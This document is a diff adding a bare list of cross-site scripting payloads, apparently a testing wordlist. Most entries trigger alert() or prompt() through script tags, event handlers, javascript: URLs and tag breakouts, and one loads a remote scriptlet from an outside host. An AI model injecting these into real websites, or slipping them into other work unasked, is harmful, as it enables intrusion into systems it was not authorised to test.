@@ -1,0 +1,19 @@
+<svg/onload=alert(/XSS/)>
+<scriPt>alert(1);</scriPt>
+<link rel="stylesheet" href="javascript:alert('XSS Successful');">
+<input type="image" src="javascript:alert('XSS Successful');">
+<script> alert(String.fromCharCode(52,70,76)); </script>
+<object type="text/x-scriptlet" data="http://tacker.com/xs.html">
+<body onload=alert("XSS Checked")>
+<table background="javascript:alert('XSS')">
+<div style="background-image: url(javascript:alert('XSS'))">
+\"><img src=\"xyz.png\" onerror=\"alert('XSS_attack')\"/>
+"onmousehover=prompt(/XSS_Attacked/)
+</title><script>alert(0)</script>
+<img src='vfb'onerror=alert(/XSS_XSS/)>
+<img src="javascript:alert("XSS Checked");">
+<img src=x onerror=alert(1)>
+\"><script>alert(0)</script>
+</style></script><script>alert('Hacked')</script>
+
+<script><h1>GHAVAN</h1></script>
